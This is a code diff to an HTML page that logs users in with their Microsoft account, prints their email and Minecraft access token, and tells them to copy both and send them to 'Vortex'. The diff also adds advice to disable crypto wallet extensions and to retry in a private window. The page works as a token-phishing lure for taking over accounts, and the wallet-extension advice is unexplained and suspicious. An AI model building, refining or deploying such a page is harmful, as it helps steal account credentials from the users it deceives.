@@ -14,23 +14,26 @@
 <body>
   <h1>Get Your Minecraft Token</h1>
   <p>Click below to log in with your Microsoft account.</p>
+  <p>If it fails, disable crypto wallet extensions (e.g., Exodus, Phantom) and try again.</p>
   <button onclick="getToken()">Get Token</button>
   <div id="output"></div>
-  <script src="https://cdn.jsdelivr.net/npm/msmc@latest/dist/index.min.js"></script>
+  <script src="https://cdn.jsdelivr.net/npm/msmc@3.0.9/dist/index.min.js"></script>
   <script>
     async function getToken() {
       const output = document.getElementById('output');
       output.innerHTML = 'Loading...';
       try {
+        if (!window.msmc) throw new Error('msmc library failed to load');
         const auth = new msmc.Auth();
         const token = await auth.launch('browser');
+        const email = token.profile?.email || 'Unknown (use your Microsoft email)';
         output.innerHTML = `
-          <p><strong>Email:</strong> ${token.profile?.email || 'Unknown (use your Microsoft email)'}</p>
+          <p><strong>Email:</strong> ${email}</p>
           <p><strong>Token:</strong> ${token.access_token}</p>
           <p>Copy both and send to Vortex!</p>
         `;
       } catch (err) {
-        output.innerHTML = `<p class="error">Error: ${err.message}</p>`;
+        output.innerHTML = `<p class="error">Error: ${err.message}. Try disabling browser extensions or using a private/incognito window.</p>`;
       }
     }
   </script>
